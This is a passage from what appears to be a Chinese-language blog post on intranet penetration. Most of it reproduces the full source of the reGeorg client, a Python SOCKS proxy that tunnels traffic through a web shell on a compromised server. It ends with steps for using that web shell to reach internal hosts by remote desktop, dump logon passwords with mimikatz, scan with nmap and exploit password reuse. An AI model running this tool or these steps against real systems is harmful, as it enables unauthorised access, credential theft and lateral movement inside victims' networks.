class="line">LEVEL = &#123;&quot;INFO&quot;: logging.INFO, &quot;DEBUG&quot;: logging.DEBUG, &#125;</span><br><span class="line"></span><br><span class="line">logLevel = &quot;INFO&quot;</span><br><span class="line"></span><br><span class="line">COLORS = &#123;</span><br><span class="line">    &#x27;WARNING&#x27;: YELLOW,</span><br><span class="line">    &#x27;INFO&#x27;: WHITE,</span><br><span class="line">    &#x27;DEBUG&#x27;: BLUE,</span><br><span class="line">    &#x27;CRITICAL&#x27;: YELLOW,</span><br><span class="line">    &#x27;ERROR&#x27;: RED,</span><br><span class="line">    &#x27;RED&#x27;: RED,</span><br><span class="line">    &#x27;GREEN&#x27;: GREEN,</span><br><span class="line">    &#x27;YELLOW&#x27;: YELLOW,</span><br><span class="line">    &#x27;BLUE&#x27;: BLUE,</span><br><span class="line">    &#x27;MAGENTA&#x27;: MAGENTA,</span><br><span class="line">    &#x27;CYAN&#x27;: CYAN,</span><br><span class="line">    &#x27;WHITE&#x27;: WHITE,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def formatter_message(message, use_color=True):</span><br><span class="line">    if use_color:</span><br><span class="line">        message = message.replace(&quot;$RESET&quot;, RESET_SEQ).replace(&quot;$BOLD&quot;, BOLD_SEQ)</span><br><span class="line">    else:</span><br><span class="line">        message = message.replace(&quot;$RESET&quot;, &quot;&quot;).replace(&quot;$BOLD&quot;, &quot;&quot;)</span><br><span class="line">    return message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ColoredFormatter(logging.Formatter):</span><br><span class="line">    def __init__(self, msg, use_color=True):</span><br><span class="line">        logging.Formatter.__init__(self, msg)</span><br><span class="line">        self.use_color = use_color</span><br><span class="line"></span><br><span class="line">    def format(self, record):</span><br><span class="line">        levelname = record.levelname</span><br><span class="line">        if self.use_color and levelname in COLORS:</span><br><span class="line">            levelname_color = COLOR_SEQ % (30 + COLORS[levelname]) + levelname + RESET_SEQ</span><br><span class="line">            record.levelname = levelname_color</span><br><span class="line">        return logging.Formatter.format(self, record)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ColoredLogger(logging.Logger):</span><br><span class="line"></span><br><span class="line">    def __init__(self, name):</span><br><span class="line">        FORMAT = &quot;[$BOLD%(levelname)-18s$RESET]  %(message)s&quot;</span><br><span class="line">        COLOR_FORMAT = formatter_message(FORMAT, True)</span><br><span class="line">        logging.Logger.__init__(self, name, logLevel)</span><br><span class="line">        if (name == &quot;transfer&quot;):</span><br><span class="line">            COLOR_FORMAT = &quot;\x1b[80D\x1b[1A\x1b[K%s&quot; % COLOR_FORMAT</span><br><span class="line">        color_formatter = ColoredFormatter(COLOR_FORMAT)</span><br><span class="line"></span><br><span class="line">        console = logging.StreamHandler()</span><br><span class="line">        console.setFormatter(color_formatter)</span><br><span class="line"></span><br><span class="line">        self.addHandler(console)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">logging.setLoggerClass(ColoredLogger)</span><br><span class="line">log = logging.getLogger(__name__)</span><br><span class="line">transferLog = logging.getLogger(&quot;transfer&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class SocksCmdNotImplemented(Exception):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class SocksProtocolNotImplemented(Exception):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class RemoteConnectionFailed(Exception):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class session(Thread):</span><br><span class="line">    def __init__(self, pSocket, connectString):</span><br><span class="line">        Thread.__init__(self)</span><br><span class="line">        self.pSocket = pSocket</span><br><span class="line">        self.connectString = connectString</span><br><span class="line">        o = urlparse(connectString)</span><br><span class="line">        try:</span><br><span class="line">            self.httpPort = o.port</span><br><span class="line">        except:</span><br><span class="line">            if o.scheme == &quot;https&quot;:</span><br><span class="line">                self.httpPort = 443</span><br><span class="line">            else:</span><br><span class="line">                self.httpPort = 80</span><br><span class="line">        self.httpScheme = o.scheme</span><br><span class="line">        self.httpHost = o.netloc.split(&quot;:&quot;)[0]</span><br><span class="line">        self.httpPath = o.path</span><br><span class="line">        self.cookie = None</span><br><span class="line">        if o.scheme == &quot;http&quot;:</span><br><span class="line">            self.httpScheme = urllib3.HTTPConnectionPool</span><br><span class="line">        else:</span><br><span class="line">            self.httpScheme = urllib3.HTTPSConnectionPool</span><br><span class="line"></span><br><span class="line">    def parseSocks5(self, sock):</span><br><span class="line">        log.debug(&quot;SocksVersion5 detected&quot;)</span><br><span class="line">        nmethods, methods = (sock.recv(1), sock.recv(1))</span><br><span class="line">        sock.sendall(VER + METHOD)</span><br><span class="line">        ver = sock.recv(1)</span><br><span class="line">        if ver == &quot;\x02&quot;:  # this is a hack for proxychains</span><br><span class="line">            ver, cmd, rsv, atyp = (sock.recv(1), sock.recv(1), sock.recv(1), sock.recv(1))</span><br><span class="line">        else:</span><br><span class="line">            cmd, rsv, atyp = (sock.recv(1), sock.recv(1), sock.recv(1))</span><br><span class="line">        target = None</span><br><span class="line">        targetPort = None</span><br><span class="line">        if atyp == &quot;\x01&quot;:  # IPv4</span><br><span class="line">            # Reading 6 bytes for the IP and Port</span><br><span class="line">            target = sock.recv(4)</span><br><span class="line">            targetPort = sock.recv(2)</span><br><span class="line">            target = &quot;.&quot; .join([str(ord(i)) for i in target])</span><br><span class="line">        elif atyp == &quot;\x03&quot;:  # Hostname</span><br><span class="line">            targetLen = ord(sock.recv(1))  # hostname length (1 byte)</span><br><span class="line">            target = sock.recv(targetLen)</span><br><span class="line">            targetPort = sock.recv(2)</span><br><span class="line">            target = &quot;&quot;.join([unichr(ord(i)) for i in target])</span><br><span class="line">        elif atyp == &quot;\x04&quot;:  # IPv6</span><br><span class="line">            target = sock.recv(16)</span><br><span class="line">            targetPort = sock.recv(2)</span><br><span class="line">            tmp_addr = []</span><br><span class="line">            for i in xrange(len(target) / 2):</span><br><span class="line">                tmp_addr.append(unichr(ord(target[2 * i]) * 256 + ord(target[2 * i + 1])))</span><br><span class="line">            target = &quot;:&quot;.join(tmp_addr)</span><br><span class="line">        targetPort = ord(targetPort[0]) * 256 + ord(targetPort[1])</span><br><span class="line">        if cmd == &quot;\x02&quot;:  # BIND</span><br><span class="line">            raise SocksCmdNotImplemented(&quot;Socks5 - BIND not implemented&quot;)</span><br><span class="line">        elif cmd == &quot;\x03&quot;:  # UDP</span><br><span class="line">            raise SocksCmdNotImplemented(&quot;Socks5 - UDP not implemented&quot;)</span><br><span class="line">        elif cmd == &quot;\x01&quot;:  # CONNECT</span><br><span class="line">            serverIp = target</span><br><span class="line">            try:</span><br><span class="line">                serverIp = gethostbyname(target)</span><br><span class="line">            except:</span><br><span class="line">                log.error(&quot;oeps&quot;)</span><br><span class="line">            serverIp = &quot;&quot;.join([chr(int(i)) for i in serverIp.split(&quot;.&quot;)])</span><br><span class="line">            self.cookie = self.setupRemoteSession(target, targetPort)</span><br><span class="line">            if self.cookie:</span><br><span class="line">                sock.sendall(VER + SUCCESS + &quot;\x00&quot; + &quot;\x01&quot; + serverIp + chr(targetPort / 256) + chr(targetPort % 256))</span><br><span class="line">                return True</span><br><span class="line">            else:</span><br><span class="line">                sock.sendall(VER + REFUSED + &quot;\x00&quot; + &quot;\x01&quot; + serverIp + chr(targetPort / 256) + chr(targetPort % 256))</span><br><span class="line">                raise RemoteConnectionFailed(&quot;[%s:%d] Remote failed&quot; % (target, targetPort))</span><br><span class="line"></span><br><span class="line">        raise SocksCmdNotImplemented(&quot;Socks5 - Unknown CMD&quot;)</span><br><span class="line"></span><br><span class="line">    def parseSocks4(self, sock):</span><br><span class="line">        log.debug(&quot;SocksVersion4 detected&quot;)</span><br><span class="line">        cmd = sock.recv(1)</span><br><span class="line">        if cmd == &quot;\x01&quot;:  # Connect</span><br><span class="line">            targetPort = sock.recv(2)</span><br><span class="line">            targetPort = ord(targetPort[0]) * 256 + ord(targetPort[1])</span><br><span class="line">            target = sock.recv(4)</span><br><span class="line">            sock.recv(1)</span><br><span class="line">            target = &quot;.&quot;.join([str(ord(i)) for i in target])</span><br><span class="line">            serverIp = target</span><br><span class="line">            try:</span><br><span class="line">                serverIp = gethostbyname(target)</span><br><span class="line">            except:</span><br><span class="line">                log.error(&quot;oeps&quot;)</span><br><span class="line">            serverIp = &quot;&quot;.join([chr(int(i)) for i in serverIp.split(&quot;.&quot;)])</span><br><span class="line">            self.cookie = self.setupRemoteSession(target, targetPort)</span><br><span class="line">            if self.cookie:</span><br><span class="line">                sock.sendall(chr(0) + chr(90) + serverIp + chr(targetPort / 256) + chr(targetPort % 256))</span><br><span class="line">                return True</span><br><span class="line">            else:</span><br><span class="line">                sock.sendall(&quot;\x00&quot; + &quot;\x91&quot; + serverIp + chr(targetPort / 256) + chr(targetPort % 256))</span><br><span class="line">                raise RemoteConnectionFailed(&quot;Remote connection failed&quot;)</span><br><span class="line">        else:</span><br><span class="line">            raise SocksProtocolNotImplemented(&quot;Socks4 - Command [%d] Not implemented&quot; % ord(cmd))</span><br><span class="line"></span><br><span class="line">    def handleSocks(self, sock):</span><br><span class="line">        # This is where we setup the socks connection</span><br><span class="line">        ver = sock.recv(1)</span><br><span class="line">        if ver == &quot;\x05&quot;:</span><br><span class="line">            return self.parseSocks5(sock)</span><br><span class="line">        elif ver == &quot;\x04&quot;:</span><br><span class="line">            return self.parseSocks4(sock)</span><br><span class="line"></span><br><span class="line">    def setupRemoteSession(self, target, port):</span><br><span class="line">        headers = &#123;&quot;X-CMD&quot;: &quot;CONNECT&quot;, &quot;X-TARGET&quot;: target, &quot;X-PORT&quot;: port&#125;</span><br><span class="line">        self.target = target</span><br><span class="line">        self.port = port</span><br><span class="line">        cookie = None</span><br><span class="line">        conn = self.httpScheme(host=self.httpHost, port=self.httpPort)</span><br><span class="line">        # response = conn.request(&quot;POST&quot;, self.httpPath, params, headers)</span><br><span class="line">        response = conn.urlopen(&#x27;POST&#x27;, self.connectString + &quot;?cmd=connect&amp;target=%s&amp;port=%d&quot; % (target, port), headers=headers, body=&quot;&quot;)</span><br><span class="line">        if response.status == 200:</span><br><span class="line">            status = response.getheader(&quot;x-status&quot;)</span><br><span class="line">            if status == &quot;OK&quot;:</span><br><span class="line">                cookie = response.getheader(&quot;set-cookie&quot;)</span><br><span class="line">                log.info(&quot;[%s:%d] HTTP [200]: cookie [%s]&quot; % (self.target, self.port, cookie))</span><br><span class="line">            else:</span><br><span class="line">                if response.getheader(&quot;X-ERROR&quot;) is not None:</span><br><span class="line">                    log.error(response.getheader(&quot;X-ERROR&quot;))</span><br><span class="line">        else:</span><br><span class="line">            log.error(&quot;[%s:%d] HTTP [%d]: [%s]&quot; % (self.target, self.port, response.status, response.getheader(&quot;X-ERROR&quot;)))</span><br><span class="line">            log.error(&quot;[%s:%d] RemoteError: %s&quot; % (self.target, self.port, response.data))</span><br><span class="line">        conn.close()</span><br><span class="line">        return cookie</span><br><span class="line"></span><br><span class="line">    def closeRemoteSession(self):</span><br><span class="line">        headers = &#123;&quot;X-CMD&quot;: &quot;DISCONNECT&quot;, &quot;Cookie&quot;: self.cookie&#125;</span><br><span class="line">        params = &quot;&quot;</span><br><span class="line">        conn = self.httpScheme(host=self.httpHost, port=self.httpPort)</span><br><span class="line">        response = conn.request(&quot;POST&quot;, self.httpPath + &quot;?cmd=disconnect&quot;, params, headers)</span><br><span class="line">        if response.status == 200:</span><br><span class="line">            log.info(&quot;[%s:%d] Connection Terminated&quot; % (self.target, self.port))</span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line">    def reader(self):</span><br><span class="line">        conn = urllib3.PoolManager()</span><br><span class="line">        while True:</span><br><span class="line">            try:</span><br><span class="line">                if not self.pSocket:</span><br><span class="line">                    break</span><br><span class="line">                data = &quot;&quot;</span><br><span class="line">                headers = &#123;&quot;X-CMD&quot;: &quot;READ&quot;, &quot;Cookie&quot;: self.cookie, &quot;Connection&quot;: &quot;Keep-Alive&quot;&#125;</span><br><span class="line">                response = conn.urlopen(&#x27;POST&#x27;, self.connectString + &quot;?cmd=read&quot;, headers=headers, body=&quot;&quot;)</span><br><span class="line">                data = None</span><br><span class="line">                if response.status == 200:</span><br><span class="line">                    status = response.getheader(&quot;x-status&quot;)</span><br><span class="line">                    if status == &quot;OK&quot;:</span><br><span class="line">                        if response.getheader(&quot;set-cookie&quot;) is not None:</span><br><span class="line">                            cookie = response.getheader(&quot;set-cookie&quot;)</span><br><span class="line">                        data = response.data</span><br><span class="line">                        # Yes I know this is horrible, but its a quick fix to issues with tomcat 5.x bugs that have been reported, will find a propper fix laters</span><br><span class="line">                        try:</span><br><span class="line">                            if response.getheader(&quot;server&quot;).find(&quot;Apache-Coyote/1.1&quot;) &gt; 0:</span><br><span class="line">                                data = data[:len(data) - 1]</span><br><span class="line">                        except:</span><br><span class="line">                            pass</span><br><span class="line">                        if data is None:</span><br><span class="line">                            data = &quot;&quot;</span><br><span class="line">                    else:</span><br><span class="line">                        data = None</span><br><span class="line">                        log.error(&quot;[%s:%d] HTTP [%d]: Status: [%s]: Message [%s] Shutting down&quot; % (self.target, self.port, response.status, status, response.getheader(&quot;X-ERROR&quot;)))</span><br><span class="line">                else:</span><br><span class="line">                    log.error(&quot;[%s:%d] HTTP [%d]: Shutting down&quot; % (self.target, self.port, response.status))</span><br><span class="line">                if data is None:</span><br><span class="line">                    # Remote socket closed</span><br><span class="line">                    break</span><br><span class="line">                if len(data) == 0:</span><br><span class="line">                    sleep(0.1)</span><br><span class="line">                    continue</span><br><span class="line">                transferLog.info(&quot;[%s:%d] &lt;&lt;&lt;&lt; [%d]&quot; % (self.target, self.port, len(data)))</span><br><span class="line">                self.pSocket.send(data)</span><br><span class="line">            except Exception, ex:</span><br><span class="line">                raise ex</span><br><span class="line">        self.closeRemoteSession()</span><br><span class="line">        log.debug(&quot;[%s:%d] Closing localsocket&quot; % (self.target, self.port))</span><br><span class="line">        try:</span><br><span class="line">            self.pSocket.close()</span><br><span class="line">        except:</span><br><span class="line">            log.debug(&quot;[%s:%d] Localsocket already closed&quot; % (self.target, self.port))</span><br><span class="line"></span><br><span class="line">    def writer(self):</span><br><span class="line">        global READBUFSIZE</span><br><span class="line">        conn = urllib3.PoolManager()</span><br><span class="line">        while True:</span><br><span class="line">            try:</span><br><span class="line">                self.pSocket.settimeout(1)</span><br><span class="line">                data = self.pSocket.recv(READBUFSIZE)</span><br><span class="line">                if not data:</span><br><span class="line">                    break</span><br><span class="line">                headers = &#123;&quot;X-CMD&quot;: &quot;FORWARD&quot;, &quot;Cookie&quot;: self.cookie, &quot;Content-Type&quot;: &quot;application/octet-stream&quot;, &quot;Connection&quot;: &quot;Keep-Alive&quot;&#125;</span><br><span class="line">                response = conn.urlopen(&#x27;POST&#x27;, self.connectString + &quot;?cmd=forward&quot;, headers=headers, body=data)</span><br><span class="line">                if response.status == 200:</span><br><span class="line">                    status = response.getheader(&quot;x-status&quot;)</span><br><span class="line">                    if status == &quot;OK&quot;:</span><br><span class="line">                        if response.getheader(&quot;set-cookie&quot;) is not None:</span><br><span class="line">                            self.cookie = response.getheader(&quot;set-cookie&quot;)</span><br><span class="line">                    else:</span><br><span class="line">                        log.error(&quot;[%s:%d] HTTP [%d]: Status: [%s]: Message [%s] Shutting down&quot; % (self.target, self.port, response.status, status, response.getheader(&quot;x-error&quot;)))</span><br><span class="line">                        break</span><br><span class="line">                else:</span><br><span class="line">                    log.error(&quot;[%s:%d] HTTP [%d]: Shutting down&quot; % (self.target, self.port, response.status))</span><br><span class="line">                    break</span><br><span class="line">                transferLog.info(&quot;[%s:%d] &gt;&gt;&gt;&gt; [%d]&quot; % (self.target, self.port, len(data)))</span><br><span class="line">            except timeout:</span><br><span class="line">                continue</span><br><span class="line">            except Exception, ex:</span><br><span class="line">                raise ex</span><br><span class="line">                break</span><br><span class="line">        self.closeRemoteSession()</span><br><span class="line">        log.debug(&quot;Closing localsocket&quot;)</span><br><span class="line">        try:</span><br><span class="line">            self.pSocket.close()</span><br><span class="line">        except:</span><br><span class="line">            log.debug(&quot;Localsocket already closed&quot;)</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        try:</span><br><span class="line">            if self.handleSocks(self.pSocket):</span><br><span class="line">                log.debug(&quot;Staring reader&quot;)</span><br><span class="line">                r = Thread(target=self.reader, args=())</span><br><span class="line">                r.start()</span><br><span class="line">                log.debug(&quot;Staring writer&quot;)</span><br><span class="line">                w = Thread(target=self.writer, args=())</span><br><span class="line">                w.start()</span><br><span class="line">                r.join()</span><br><span class="line">                w.join()</span><br><span class="line">        except SocksCmdNotImplemented, si:</span><br><span class="line">            log.error(si.message)</span><br><span class="line">            self.pSocket.close()</span><br><span class="line">        except SocksProtocolNotImplemented, spi:</span><br><span class="line">            log.error(spi.message)</span><br><span class="line">            self.pSocket.close()</span><br><span class="line">        except Exception, e:</span><br><span class="line">            log.error(e.message)</span><br><span class="line">            self.closeRemoteSession()</span><br><span class="line">            self.pSocket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def askGeorg(connectString):</span><br><span class="line">    connectString = connectString</span><br><span class="line">    o = urlparse(connectString)</span><br><span class="line">    try:</span><br><span class="line">        httpPort = o.port</span><br><span class="line">    except:</span><br><span class="line">        if o.scheme == &quot;https&quot;:</span><br><span class="line">            httpPort = 443</span><br><span class="line">        else:</span><br><span class="line">            httpPort = 80</span><br><span class="line">    httpScheme = o.scheme</span><br><span class="line">    httpHost = o.netloc.split(&quot;:&quot;)[0]</span><br><span class="line">    httpPath = o.path</span><br><span class="line">    if o.scheme == &quot;http&quot;:</span><br><span class="line">        httpScheme = urllib3.HTTPConnectionPool</span><br><span class="line">    else:</span><br><span class="line">        httpScheme = urllib3.HTTPSConnectionPool</span><br><span class="line"></span><br><span class="line">    conn = httpScheme(host=httpHost, port=httpPort)</span><br><span class="line">    response = conn.request(&quot;GET&quot;, httpPath)</span><br><span class="line">    if response.status == 200:</span><br><span class="line">        if BASICCHECKSTRING == response.data.strip():</span><br><span class="line">            log.info(BASICCHECKSTRING)</span><br><span class="line">            return True</span><br><span class="line">    conn.close()</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print &quot;&quot;&quot;\033[1m</span><br><span class="line">    \033[1;33m</span><br><span class="line">                     _____</span><br><span class="line">  _____   ______  __|___  |__  ______  _____  _____   ______</span><br><span class="line"> |     | |   ___||   ___|    ||   ___|/     \|     | |   ___|</span><br><span class="line"> |     \ |   ___||   |  |    ||   ___||     ||     \ |   |  |</span><br><span class="line"> |__|\__\|______||______|  __||______|\_____/|__|\__\|______|</span><br><span class="line">                    |_____|</span><br><span class="line">                    ... every office needs a tool like Georg</span><br><span class="line"></span><br><span class="line">  willem@sensepost.com / @_w_m__</span><br><span class="line">  sam@sensepost.com / @trowalts</span><br><span class="line">  etienne@sensepost.com / @kamp_staaldraad</span><br><span class="line">  \033[0m</span><br><span class="line">   &quot;&quot;&quot;</span><br><span class="line">    log.setLevel(logging.DEBUG)</span><br><span class="line">    parser = argparse.ArgumentParser(description=&#x27;Socks server for reGeorg HTTP(s) tunneller&#x27;)</span><br><span class="line">    parser.add_argument(&quot;-l&quot;, &quot;--listen-on&quot;, metavar=&quot;&quot;, help=&quot;The default listening address&quot;, default=&quot;127.0.0.1&quot;)</span><br><span class="line">    parser.add_argument(&quot;-p&quot;, &quot;--listen-port&quot;, metavar=&quot;&quot;, help=&quot;The default listening port&quot;, type=int, default=&quot;8888&quot;)</span><br><span class="line">    parser.add_argument(&quot;-r&quot;, &quot;--read-buff&quot;, metavar=&quot;&quot;, help=&quot;Local read buffer, max data to be sent per POST&quot;, type=int, default=&quot;1024&quot;)</span><br><span class="line">    parser.add_argument(&quot;-u&quot;, &quot;--url&quot;, metavar=&quot;&quot;, required=True, help=&quot;The url containing the tunnel script&quot;)</span><br><span class="line">    parser.add_argument(&quot;-v&quot;, &quot;--verbose&quot;, metavar=&quot;&quot;, help=&quot;Verbose output[INFO|DEBUG]&quot;, default=&quot;INFO&quot;)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    if (args.verbose in LEVEL):</span><br><span class="line">        log.setLevel(LEVEL[args.verbose])</span><br><span class="line">        log.info(&quot;Log Level set to [%s]&quot; % args.verbose)</span><br><span class="line"></span><br><span class="line">    log.info(&quot;Starting socks server [%s:%d], tunnel at [%s]&quot; % (args.listen_on, args.listen_port, args.url))</span><br><span class="line">    log.info(&quot;Checking if Georg is ready&quot;)</span><br><span class="line">    if not askGeorg(args.url):</span><br><span class="line">        log.info(&quot;Georg is not ready, please check url&quot;)</span><br><span class="line">        exit()</span><br><span class="line">    READBUFSIZE = args.read_buff</span><br><span class="line">    servSock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">    servSock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)</span><br><span class="line">    servSock.bind((args.listen_on, args.listen_port))</span><br><span class="line">    servSock.listen(1000)</span><br><span class="line">    while True:</span><br><span class="line">        try:</span><br><span class="line">            sock, addr_info = servSock.accept()</span><br><span class="line">            sock.settimeout(SOCKTIMEOUT)</span><br><span class="line">            log.debug(&quot;Incomming connection&quot;)</span><br><span class="line">            session(sock, args.url).start()</span><br><span class="line">        except KeyboardInterrupt, ex:</span><br><span class="line">            break</span><br><span class="line">        except Exception, e:</span><br><span class="line">            log.error(e)</span><br><span class="line">    servSock.close()</span><br></pre></td></tr></table></figure>

<p>在webshell命令行使用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看内网地址</span><br><span class="line">ipconfig</span><br><span class="line">使用远程桌面连接</span><br></pre></td></tr></table></figure>

<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/neiwang/4.png" alt="4" data-caption="4" loading="lazy"></p>
<p>使用工具(mimikatz.exe)抓取密码:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug 提升权限</span><br><span class="line">sekurlsa::logonpasswords 抓取密码</span><br><span class="line">log 日志会记录内容</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">打开windows-cmd</span><br><span class="line">mimikatz.exe</span><br><span class="line">进入后使用启用日志功能,会在目录下输出mimikatz.log文件</span><br><span class="line">log</span><br><span class="line">提升权限后,抓取密码，查看管理员密码，用远程桌面进行登录.</span><br><span class="line">安装nmap进行内网扫码.</span><br><span class="line">在内网中很多机器是使用同一密码可以一次测试.</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>技术</tag>
      </tags>
  </entry>
</search>
